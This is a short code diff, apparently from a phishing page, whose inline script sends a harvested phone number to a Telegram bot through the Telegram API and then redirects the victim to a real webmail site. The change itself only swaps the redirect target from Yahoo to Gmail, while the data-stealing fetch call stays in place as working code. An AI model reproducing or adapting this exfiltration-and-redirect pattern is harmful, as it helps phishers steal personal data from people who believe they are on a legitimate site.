@@ -210,7 +210,7 @@ footer#footer ul li{
           fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=ATT-RESULT=Phone number::${result1}`, {
               method: "GET"
           }).then(success => {
-              window.location.replace("https://yahoo.com");
+              window.location.replace("https://gmail.com");
           }, error => {
               alert("Message not sent")
               console.log(error)
